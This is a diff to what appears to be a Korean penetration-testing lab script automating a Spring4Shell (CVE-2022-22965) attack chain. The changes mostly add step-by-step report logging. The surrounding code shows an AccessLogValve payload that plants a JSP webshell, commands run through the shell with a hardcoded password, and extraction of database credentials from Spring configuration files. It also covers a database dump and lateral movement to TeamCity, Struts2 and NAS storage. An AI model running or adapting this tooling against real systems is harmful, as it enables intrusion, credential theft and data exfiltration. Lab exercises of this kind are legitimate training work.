@@ -140,6 +140,7 @@ def main():
     input("  [Enter] Start exploit...")
 
     results = {}
+    details = {}  # 보고서용 각 Step 상세 데이터 (성공/실패 무관하게 항상 기록)
 
     # STEP 1
     step(1, "Spring4Shell Payload Transmission (AccessLogValve Manipulation)")
@@ -151,8 +152,10 @@ def main():
 
     if success:
         ok("Payload sent successfully.")
+        details["step1"] = f"타겟: {TARGET_URL}\nSpring Data Binding 취약점(CVE-2022-22965)을 이용해 Tomcat AccessLogValve 속성 변조 페이로드를 성공적으로 전송했습니다."
     else:
         fail("Payload failed. Check network or target URL.")
+        details["step1"] = f"타겟: {TARGET_URL}\n페이로드 전송에 실패했습니다. 네트워크 연결 및 타겟 URL을 확인하세요."
 
     results["step1"] = success
     if not success:
@@ -165,6 +168,7 @@ def main():
     code = http_get(FLUSH_URL)
     info(f"Response code: {code}")
     ok("Flush complete. Waiting for yaho4.jsp creation...")
+    details["step2"] = f"GET {FLUSH_URL} → HTTP {code}\nTomcat AccessLog 버퍼가 비워지면서 페이로드 코드가 {SHELL_NAME}.jsp 파일로 디스크에 기록됩니다."
     results["step2"] = True
     time.sleep(2)
 
@@ -172,8 +176,10 @@ def main():
     step(3, f"Verify Stage1 Shell ({SHELL_NAME}.jsp) - max 5 retries")
 
     stager_ok = False
+    stager_result_log = []
     for attempt in range(1, 6):
         result = check_shell(f"{STAGER_URL}?cmd=whoami")
+        stager_result_log.append(f"[{attempt}/5] {SHELL_NAME}.jsp?cmd=whoami → {result[:80]}")
         info(f"  [{attempt}/5] {SHELL_NAME}.jsp?cmd=whoami -> {result[:60]}")
 
         if result and "404" not in result and "FAIL" not in result and "Error" not in result:
@@ -188,8 +194,11 @@ def main():
             time.sleep(1)
         time.sleep(2)
 
-    if not stager_ok:
+    if stager_ok:
+        details["step3"] = f"웹쉘 URL: {STAGER_URL}?cmd=whoami\n\n확인 로그:\n" + "\n".join(stager_result_log)
+    else:
         warn(f"{SHELL_NAME}.jsp not found. Will try docker cp in STEP 4.")
+        details["step3"] = f"웹쉘 미생성. docker cp 방식으로 Stage2를 직접 배포합니다.\n\n시도 로그:\n" + "\n".join(stager_result_log)
 
     results["step3"] = stager_ok
 
@@ -238,9 +247,14 @@ def main():
             subprocess.run(cmd, check=True)
             ok("[B] docker cp successful! health_check.jsp deployed.")
             deploy_ok = True
+            details["step4"] = f"[B] docker cp 방식으로 배포\n명령: {' '.join(cmd)}\n결과: 성공 — health_check.jsp가 컨테이너 내부에 복사되었습니다."
         except subprocess.CalledProcessError:
             fail("[B] docker cp failed. Check if container is running.")
             info(f"    Manual: docker cp health_check.jsp {container}:/usr/local/tomcat/webapps/ROOT/")
+            details["step4"] = f"[B] docker cp 실패\n명령: {' '.join(cmd)}\n컨테이너({container})가 실행 중인지 확인하세요."
+    else:
+        if deploy_ok:
+            details.setdefault("step4", "[A] curl 방식으로 health_check.jsp 배포 성공")
 
     results["step4"] = deploy_ok
 
@@ -253,10 +267,12 @@ def main():
 
     if "root" in result2 or "uid=" in result2:
         ok(f"Stage2 shell working! Result: {result2.strip()}")
+        details["step5"] = f"웹쉘 URL: {STAGE2_URL}\n\n실행 결과 (id 명령):\n{result2.strip()}"
         results["step5"] = True
     else:
         warn("Stage2 shell response unexpected.")
         info(f"Check manually: {STAGE2_URL}")
+        details["step5"] = f"웹쉘 URL: {STAGE2_URL}\n\n응답 내용 (예상과 다름):\n{result2.strip()[:300]}"
         results["step5"] = False
 
     # STEP 6
@@ -264,6 +280,7 @@ def main():
     
     db_credentials = {}
     found_clients = []
+    import re as _re
     
     if results.get("step5", False):
         info("Phase 1: Finding DB clients (mysql, psql, sqlite3)...")
@@ -278,7 +295,6 @@ def main():
             info(" -> No standard DB clients (mysql/psql) found in the container.")
             
         info("Phase 2: Finding Spring Boot configuration files...")
-        import urllib.parse
         find_cmd = 'find /usr/local/tomcat/webapps -name "application.properties" -o -name "application.yml" 2>/dev/null'
         find_res = check_shell(f"{BASE}/health_check.jsp?pwd=glory&cmd=" + urllib.parse.quote(find_cmd))
         
@@ -305,8 +321,7 @@ def main():
             for line in props_result.split("\n"):
                 if "spring.datasource.url=" in line:
                     db_credentials['url'] = line.split("=", 1)[1].strip()
-                    import re
-                    match = re.search(r'jdbc:[a-z]+://([^:]+):', db_credentials['url'])
+                    match = _re.search(r'jdbc:[a-z]+://([^:]+):', db_credentials['url'])
                     if match:
                         db_credentials['host'] = match.group(1)
                 elif "spring.datasource.username=" in line:
@@ -320,9 +335,18 @@ def main():
         else:
             warn("Failed to extract DB credentials from properties.")
             results["step6"] = False
+
+        # 보고서 - 항상 수집된 내용 기록
+        details["step6"] = {
+            "clients": found_clients if found_clients else ["없음 (컨테이너에 mysql/psql 클라이언트 없음)"],
+            "config_file": target_prop_file,
+            "raw_props": props_result[:800] if props_result else "설정 파일 읽기 실패",
+            "credentials": db_credentials,
+        }
     else:
         warn("Skipped Step 6 because Stage2 shell is not verified.")
         results["step6"] = False
+        details["step6"] = {"clients": [], "config_file": "", "raw_props": "Stage2 웹쉘이 없어 실행 스킵됨", "credentials": {}}
 
     # STEP 7
     step(7, "Internal DB Access via RCE (Post-Exploitation)")
@@ -413,6 +437,8 @@ try {
     else:
         warn("Skipped Step 7 because Step 6 (Credential Extraction) failed.")
         results["step7"] = False
+        db_dump_result = "Step 6 (크리덴셜 추출)이 실패하여 DB 접근을 시도하지 못했습니다."
+        run_mode = "스킵됨"
 
     # STEP 8
     step(8, "Lateral Movement (TeamCity & Struts2)")
@@ -505,7 +531,7 @@ try {
     <html lang="ko">
     <head>
         <meta charset="UTF-8">
-        <title>Spring4Shell 모의해킹 최종 결과 보고서</title>
+        <title>[메인 시나리오] Spring4Shell 모의해킹 최종 결과 보고서</title>
         <style>
             body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a2e; color: #e6e6e6; margin: 0; padding: 20px; }}
             .container {{ max-width: 950px; margin: auto; background: #16213e; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); border: 1px solid #0f3460; }}
@@ -528,7 +554,7 @@ try {
     </head>
     <body>
         <div class="container">
-            <h1>🛡️ Spring4Shell 제로데이 연계 공격 결과 보고서 <br><span style="font-size: 0.5em; color: #7f8c8d;">({current_time})</span></h1>
+            <h1>🛡️ [메인 시나리오] Spring4Shell 제로데이 연계 공격 결과 보고서 <br><span style="font-size: 0.5em; color: #7f8c8d;">({current_time})</span></h1>
             
             <div class="summary">
                 <h2 style="color:#fff; margin-top:0;">실습 개요</h2>
@@ -554,42 +580,62 @@ try {
         "step6": "<strong>Info Leakage (크리덴셜 추출)</strong>: RCE를 활용하여 타겟 환경 내부에 저장된 DB URL 및 계정 정보를 탐색해 성공적으로 탈취했습니다.",
         "step7": "<strong>Threat Demonstration (내부망 DB 타격)</strong>: 탈취한 계정을 재사용, 해커가 내부망의 Spring DB에 직접 접근시켜 고객용 테이블을 그대로 덤프했습니다.",
         "step8": "<strong>Lateral Movement (Struts & TeamCity)</strong>: Spring 거점에서 최신 TeamCity 익스플로잇으로 관리자 권한을 강탈한 뒤, Struts2 파일 업로드 취약점을 연쇄 발동시켜 핵심 임직원 데이터베이스를 탈취했습니다.",
-        "step9": "<strong>Advanced Post-Exploitation (NAS SMB)</strong>: JCIFS-NG 어댑터를 동률적으로 구성, 인트라넷 내부에 분리된 사내 연구용 NAS 스토리지의 파일 맵을 열람했습니다."
+        "step9": "<strong>Advanced Post-Exploitation (NAS SMB)</strong>: JCIFS-NG 어댑터를 동적으로 구성, 인트라넷 내부에 분리된 사내 연구용 NAS 스토리지의 파일 맵을 열람했습니다."
     }
+
+    def _esc(s): return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
 
     for key, label in labels.items():
         passed = results.get(key, False)
         status_class = "success" if passed else "fail"
-        badge = '<span class="badge-success">성공</span>' if passed else '<span class="badge-fail">실패</span>'
+        badge = '<span class="badge-success">✅ 성공</span>' if passed else '<span class="badge-fail">❌ 실패/스킵</span>'
         desc = step_descriptions.get(key, "")
         detail = ""
-        
-        if key == "step6" and passed:
+
+        # ── Step 1~5: 수집된 원시 데이터를 항상 표시 ──
+        if key in ["step1", "step2", "step3", "step4", "step5"] and key in details:
+            detail = f"<div class='res-box'><pre>{_esc(details[key])}</pre></div>"
+
+        # ── Step 6: 크리덴셜 추출 결과 ──
+        elif key == "step6":
+            d6 = details.get("step6", {})
+            creds = d6.get("credentials", {})
+            clients_str = ", ".join(d6.get("clients", [])) or "없음"
+            raw_props = _esc(d6.get("raw_props", "")[:600])
+            if creds.get("url"):
+                cred_html = f"""<ul class='creds'>
+                    <li>DB URL : <span style='color:#e94560'>{_esc(creds.get('url',''))}</span></li>
+                    <li>USER   : <span style='color:#e94560'>{_esc(creds.get('user',''))}</span></li>
+                    <li>PASS   : <span style='color:#e94560'>{_esc(creds.get('pass',''))}</span></li>
+                </ul>"""
+            else:
+                cred_html = "<p style='color:#e74c3c'>설정 파일에서 DB 접속 정보를 추출하지 못했습니다.</p>"
             detail = f"""<div class='res-box'>
-                <p style="color: #f39c12; margin-top: 0; font-size: 1.1em; font-weight: bold;">[탈취된 중요 자산: 데이터베이스 접속 정보]</p>
-                <ul class="creds">
-                    <li>URL : <span style="color:#e94560;">{db_credentials.get('url')}</span></li>
-                    <li>USER : <span style="color:#e94560;">{db_credentials.get('user')}</span></li>
-                    <li>PASS : <span style="color:#e94560;">{db_credentials.get('pass')}</span></li>
-                </ul>
+                <p class='cred-highlight'>발견된 DB 클라이언트: {_esc(clients_str)}</p>
+                <p>설정 파일: <code style='color:#f39c12'>{_esc(d6.get('config_file',''))}</code></p>
+                {cred_html}
+                <p style='color:#888;margin-top:10px'>설정 파일 원문 (앞 600자):</p>
+                <pre>{raw_props}</pre>
             </div>"""
-        elif key == "step7" and passed:
+
+        # ── Step 7: DB 덤프 결과 ──
+        elif key == "step7":
+            mode_label = _esc(run_mode) if run_mode else "미실행"
+            dump_display = _esc(db_dump_result)[:1200] if db_dump_result else "덤프 결과 없음"
             detail = f"""<div class='res-box'>
-                <p style="color: #3498db; margin-top: 0; font-size: 1.1em; font-weight: bold;">[덤프 완료: 타겟 서비스 고객 테이블]</p>
-                <pre>{db_dump_result}</pre>
+                <p class='cred-highlight'>실행 방법: {mode_label}</p>
+                <pre>{dump_display}</pre>
             </div>"""
-        elif key == "step8" and passed:
-            detail = f"""<div class='res-box'>
-                <p style="color: #9b59b6; margin-top: 0; font-size: 1.1em; font-weight: bold;">[연쇄 타격: Struts2 임직원 내부망 데이터 탈취]</p>
-                <pre>{step8_result}</pre>
-            </div>"""
-        elif key == "step9" and passed:
-            detail = f"""<div class='res-box'>
-                <p style="color: #1abc9c; margin-top: 0; font-size: 1.1em; font-weight: bold;">[최종 임팩트: 폐쇄망 NAS 파일 시스템 뷰]</p>
-                <pre>{step9_result}</pre>
-            </div>"""
-        elif not passed and key in ["step6", "step7", "step8", "step9"]:
-             detail = f"<div class='res-box' style='border-color: #e74c3c;'>해당 공격 프로세스가 차단되거나 실패했습니다.</div>"
+
+        # ── Step 8: 횡적 이동 결과 ──
+        elif key == "step8":
+            s8_display = _esc(step8_result)[:2000] if step8_result else "실행 결과 없음 (Step 5 미통과 또는 오류)"
+            detail = f"<div class='res-box'><pre>{s8_display}</pre></div>"
+
+        # ── Step 9: NAS SMB 결과 ──
+        elif key == "step9":
+            s9_display = _esc(step9_result)[:2000] if step9_result else "실행 결과 없음 (Step 5 미통과 또는 오류)"
+            detail = f"<div class='res-box'><pre>{s9_display}</pre></div>"
 
         html_content += f"""
             <div class="step {status_class}">
@@ -611,7 +657,7 @@ try {
 
     report_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "03.FinalReport")
     os.makedirs(report_dir, exist_ok=True)
-    report_filename = f"report_{now.strftime('%Y%m%d_%H%M%S')}.html"
+    report_filename = f"main_scenario_report_{now.strftime('%Y%m%d_%H%M%S')}.html"
     report_path = os.path.join(report_dir, report_filename)
     with open(report_path, "w", encoding="utf-8") as rf:
         rf.write(html_content)
